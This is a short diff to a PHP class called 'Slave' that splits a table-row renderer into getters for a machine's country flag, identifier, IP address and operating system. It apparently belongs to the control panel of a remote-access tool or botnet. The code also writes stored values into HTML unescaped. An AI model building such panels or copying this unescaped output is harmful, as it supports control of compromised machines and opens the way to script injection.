@@ -1,4 +1,6 @@
 <?php
+require_once "operatingsystem.php";
+
 class Slave {
 
 	public $array;
@@ -14,16 +16,25 @@ class Slave {
 		);
 	}
 
-	public function getTableFormatted($i = 0) {
-		require_once "operatingsystem.php";
-
-		$country = '<img src="images/flags/' . strtolower($this->array['country']) . '.png"> ' . $this->array['country'];
-		$userstring = '<b>' . $this->array['userstring'] . '</b>';
+	public function getUniqueId() {
+		return $this->array['id'];
+	}
+	
+	public function getDisplayCountry() {
+		return $country = '<img src="images/flags/' . strtolower($this->array['country']) . '.png"> ' . $this->array['country'];
+	}
+	
+	public function getIdentifier() {
+		return $userstring = '<b>' . $this->array['userstring'] . '</b>';
+	}
+	
+	public function getIP() {
+		return $this->array['ip'];
+	}
+	
+	public function getOperatingSystem() {
 		$os = $this->array['os'];
 		$osIcon = '<img src="' . OperatingSystem::getIcon($os) . '"> ' . $os;
-		$ip = $this->array['ip'];
-
-		return "<td class=%c>" . $country . "</td>\n<td class=%c>" . $userstring . "</td>\n<td class=%c>" . $osIcon . "</td>\n<td class=%c>$ip</td>\n" . 
-		"<td class=%c><input class='box' type='checkbox' name='select[$i]' value='" . $this->array['id'] . "'></td>";
+		return $osIcon;
 	}
 }
